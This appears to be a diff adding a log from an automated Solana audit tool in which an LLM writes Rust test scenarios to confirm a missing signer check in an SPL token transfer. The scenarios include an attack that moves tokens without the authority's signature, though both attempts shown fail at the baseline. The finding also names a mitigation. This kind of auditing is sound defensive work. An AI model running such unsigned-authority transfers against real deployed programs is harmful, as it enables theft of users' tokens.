+      "scenario": "let authority = Pubkey::new_unique();\nlet source = Pubkey::new_unique();\nlet destination = Pubkey::new_unique();\nlet mint = Pubkey::new_unique();\n\nlet token_program_id = Pubkey::new_from_array([\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\n]);\n\nfn token_account_data(mint: &Pubkey, owner: &Pubkey, amount: u64) -> Vec<u8> {\n    let mut d = Vec::with_capacity(165);\n    d.extend_from_slice(mint.as_ref());\n    d.extend_from_slice(owner.as_ref());\n    d.extend_from_slice(&amount.to_le_bytes());\n    d.extend_from_slice(&[0u8; 36]); // delegate: COption<Pubkey> = None\n    d.push(1u8); // state: Initialized\n    d.extend_from_slice(&[0u8; 12]); // is_native: COption<u64> = None\n    d.extend_from_slice(&0u64.to_le_bytes()); // delegated_amount\n    d.extend_from_slice(&[0u8; 36]); // close_authority: COption<Pubkey> = None\n    d\n}\n\nlet source_data = token_account_data(&mint, &authority, 1000u64);\nlet dest_data = token_account_data(&mint, &authority, 0u64);\n\nlet source_acc = account(&token_program_id, &source_data, None);\nlet dest_acc = account(&token_program_id, &dest_data, None);\nlet authority_acc = wallet(1_000_000_000);\n\nlet contas = vec![\n    (source, source_acc.clone()),\n    (destination, dest_acc.clone()),\n    (authority, authority_acc.clone()),\n    (token_program_id, program_account(&token_program_id)),\n];\n\nlet metas = vec![\n    AccountMeta::new(source, false),\n    AccountMeta::new(destination, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new_readonly(token_program_id, false),\n];\n\nlet ix = env.anchor_ix(\"cpi\", &(100u64,), metas);\nlet baseline = env.baseline(\"transferencia legitima com authority assinando\", &ix, &contas);\n\nlet metas_ataque = vec![\n    AccountMeta::new(source, false),\n    AccountMeta::new(destination, false),\n    AccountMeta::new_readonly(authority, false),\n    AccountMeta::new_readonly(token_program_id, false),\n];\n\nlet ix_ataque = env.anchor_ix(\"cpi\", &(100u64,), metas_ataque);\nlet r = env.attack(\"transferencia sem assinatura da authority\", &ix_ataque, &contas);\n\nif r.program_result == ProgramResult::Success {\n    let dest_after = after(&r, &destination);\n    let source_after = after(&r, &source);\n    let dest_amount = read_u64(dest_after.data(), 64);\n    let source_amount = read_u64(source_after.data(), 64);\n    env.effect(\"tokens movidos sem assinatura da authority\", dest_amount == 100 && source_amount == 900);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "transferencia legitima com authority assinando",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3407,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "28685cf30b95ff34",
+                "post": "00000000000000050000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000e803000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "69a246c0b74e7fbc",
+                "post": "000000000000000500000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "transferencia sem assinatura da authority",
+            "result": "UnknownError(PrivilegeEscalation)",
+            "compute_units": 3408,
+            "account_flags": "-w,-w,-r,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "28685cf30b95ff34",
+                "post": "00000000000000050000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000e803000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "69a246c0b74e7fbc",
+                "post": "000000000000000500000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3407 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3408 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: Cross-program invocation with unauthorized signer or writable account"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'transferencia legitima com authority assinando' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 5,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3201,
+        "completion_tokens": 1117,
+        "latency_s": 4.84
+      },
+      "raw": "{\"plan\": \"O baseline falhou com InvalidAccountData porque o layout da conta de token SPL estava incorreto (o campo is_native e COption<u64> com 4 bytes de tag + 8 de valor, e o delegated_amount vem antes do close_authority). Corrijo o layout para 165 bytes exatos: mint(32) + owner(32) + amount(8) + delegate(36) + state(1) + is_native(12) + delegated_amount(8) + close_authority(36). Com o layout correto, o baseline (authority assinando) deve ter sucesso e o ataque (authority sem assinar) tenta a mesma transferencia; o efeito mede se os tokens se moveram sem a assinatura da autoridade.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet source = Pubkey::new_unique();\\nlet destination = Pubkey::new_unique();\\nlet mint = Pubkey::new_unique();\\n\\nlet token_program_id = Pubkey::new_from_array([\\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\\n]);\\n\\nfn token_account_data(mint: &Pubkey, owner: &Pubkey, amount: u64) -> Vec<u8> {\\n    let mut d = Vec::with_capacity(165);\\n    d.extend_from_slice(mint.as_ref());\\n    d.extend_from_slice(owner.as_ref());\\n    d.extend_from_slice(&amount.to_le_bytes());\\n    d.extend_from_slice(&[0u8; 4]); // delegate: COption tag = None\\n    d.extend_from_slice(&[0u8; 32]); // delegate pubkey\\n    d.push(1u8); // state: Initialized\\n    d.extend_from_slice(&[0u8; 4]); // is_native: COption tag = None\\n    d.extend_from_slice(&0u64.to_le_bytes()); // is_native value\\n    d.extend_from_slice(&0u64.to_le_bytes()); // delegated_amount\\n    d.extend_from_slice(&[0u8; 4]); // close_authority: COption tag = None\\n    d.extend_from_slice(&[0u8; 32]); // close_authority pubkey\\n    d\\n}\\n\\nlet source_data = token_account_data(&mint, &authority, 1000u64);\\nlet dest_data = token_account_data(&mint, &authority, 0u64);\\n\\nlet source_acc = account(&token_program_id, &source_data, None);\\nlet dest_acc = account(&token_program_id, &dest_data, None);\\nlet authority_acc = wallet(1_000_000_000);\\n\\nlet contas = vec![\\n    (source, source_acc.clone()),\\n    (destination, dest_acc.clone()),\\n    (authority, authority_acc.clone()),\\n    (token_program_id, program_account(&token_program_id)),\\n];\\n\\nlet metas = vec![\\n    AccountMeta::new(source, false),\\n    AccountMeta::new(destination, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new_readonly(token_program_id, false),\\n];\\n\\nlet ix = env.anchor_ix(\\\"cpi\\\", &(100u64,), metas);\\nlet baseline = env.baseline(\\\"transferencia legitima com authority assinando\\\", &ix, &contas);\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(source, false),\\n    AccountMeta::new(destination, false),\\n    AccountMeta::new_readonly(authority, false),\\n    AccountMeta::new_readonly(token_program_id, false),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\\"cpi\\\", &(100u64,), metas_ataque);\\nlet r = env.attack(\\\"transferencia sem assinatura da authority\\\", &ix_ataque, &contas);\\n\\nif r.program_result == ProgramResult::Success {\\n    let dest_after = after(&r, &destination);\\n    let source_after = after(&r, &source);\\n    let dest_amount = read_u64(dest_after.data(), 64);\\n    let source_amount = read_u64(source_after.data(), 64);\\n    env.effect(\\\"tokens movidos sem assinatura da authority\\\", dest_amount == 100 && source_amount == 900);\\n}\"}",
+      "plan": "O baseline falhou com InvalidAccountData porque o layout da conta de token SPL estava incorreto (o campo is_native e COption<u64> com 4 bytes de tag + 8 de valor, e o delegated_amount vem antes do close_authority). Corrijo o layout para 165 bytes exatos: mint(32) + owner(32) + amount(8) + delegate(36) + state(1) + is_native(12) + delegated_amount(8) + close_authority(36). Com o layout correto, o baseline (authority assinando) deve ter sucesso e o ataque (authority sem assinar) tenta a mesma transferencia; o efeito mede se os tokens se moveram sem a assinatura da autoridade.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet source = Pubkey::new_unique();\nlet destination = Pubkey::new_unique();\nlet mint = Pubkey::new_unique();\n\nlet token_program_id = Pubkey::new_from_array([\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\n]);\n\nfn token_account_data(mint: &Pubkey, owner: &Pubkey, amount: u64) -> Vec<u8> {\n    let mut d = Vec::with_capacity(165);\n    d.extend_from_slice(mint.as_ref());\n    d.extend_from_slice(owner.as_ref());\n    d.extend_from_slice(&amount.to_le_bytes());\n    d.extend_from_slice(&[0u8; 4]); // delegate: COption tag = None\n    d.extend_from_slice(&[0u8; 32]); // delegate pubkey\n    d.push(1u8); // state: Initialized\n    d.extend_from_slice(&[0u8; 4]); // is_native: COption tag = None\n    d.extend_from_slice(&0u64.to_le_bytes()); // is_native value\n    d.extend_from_slice(&0u64.to_le_bytes()); // delegated_amount\n    d.extend_from_slice(&[0u8; 4]); // close_authority: COption tag = None\n    d.extend_from_slice(&[0u8; 32]); // close_authority pubkey\n    d\n}\n\nlet source_data = token_account_data(&mint, &authority, 1000u64);\nlet dest_data = token_account_data(&mint, &authority, 0u64);\n\nlet source_acc = account(&token_program_id, &source_data, None);\nlet dest_acc = account(&token_program_id, &dest_data, None);\nlet authority_acc = wallet(1_000_000_000);\n\nlet contas = vec![\n    (source, source_acc.clone()),\n    (destination, dest_acc.clone()),\n    (authority, authority_acc.clone()),\n    (token_program_id, program_account(&token_program_id)),\n];\n\nlet metas = vec![\n    AccountMeta::new(source, false),\n    AccountMeta::new(destination, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new_readonly(token_program_id, false),\n];\n\nlet ix = env.anchor_ix(\"cpi\", &(100u64,), metas);\nlet baseline = env.baseline(\"transferencia legitima com authority assinando\", &ix, &contas);\n\nlet metas_ataque = vec![\n    AccountMeta::new(source, false),\n    AccountMeta::new(destination, false),\n    AccountMeta::new_readonly(authority, false),\n    AccountMeta::new_readonly(token_program_id, false),\n];\n\nlet ix_ataque = env.anchor_ix(\"cpi\", &(100u64,), metas_ataque);\nlet r = env.attack(\"transferencia sem assinatura da authority\", &ix_ataque, &contas);\n\nif r.program_result == ProgramResult::Success {\n    let dest_after = after(&r, &destination);\n    let source_after = after(&r, &source);\n    let dest_amount = read_u64(dest_after.data(), 64);\n    let source_amount = read_u64(source_after.data(), 64);\n    env.effect(\"tokens movidos sem assinatura da authority\", dest_amount == 100 && source_amount == 900);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "transferencia legitima com authority assinando",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3407,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "28685cf30b95ff34",
+                "post": "00000000000000050000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000e803000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "69a246c0b74e7fbc",
+                "post": "000000000000000500000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "transferencia sem assinatura da authority",
+            "result": "UnknownError(PrivilegeEscalation)",
+            "compute_units": 3408,
+            "account_flags": "-w,-w,-r,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "28685cf30b95ff34",
+                "post": "00000000000000050000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000e803000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "69a246c0b74e7fbc",
+                "post": "000000000000000500000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3407 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3408 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: Cross-program invocation with unauthorized signer or writable account"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'transferencia legitima com authority assinando' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    }
+  ],
+  "case_id": "SL-05-INS",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "authority: AccountInfo<'info>,\n...\nctx.accounts.authority.key,\n&[],\n...\nctx.accounts.authority.clone(),",
+    "explanation": "A conta `authority` e recebida como `AccountInfo` generica e usada como autoridade da transferencia SPL sem verificar `is_signer`. Nao ha `Signer<'info>` nem `require!(authority.is_signer)`. A instrucao de transferencia do SPL Token exige que a autoridade assine, mas o programa nao valida essa flag antes de montar a CPI.",
+    "attack_hypothesis": "O atacante fornece uma conta `authority` que nao assinou a transacao (ou cuja chave publica e conhecida) e tenta executar a transferencia. Sem a checagem de assinatura, o programa pode aceitar a autoridade forjada, permitindo movimentar tokens de uma conta `source` sem o consentimento do verdadeiro dono.",
+    "mitigation": "Usar `Signer<'info>` para a conta `authority` ou validar explicitamente `require!(ctx.accounts.authority.is_signer, ...)`."
+  }
+}
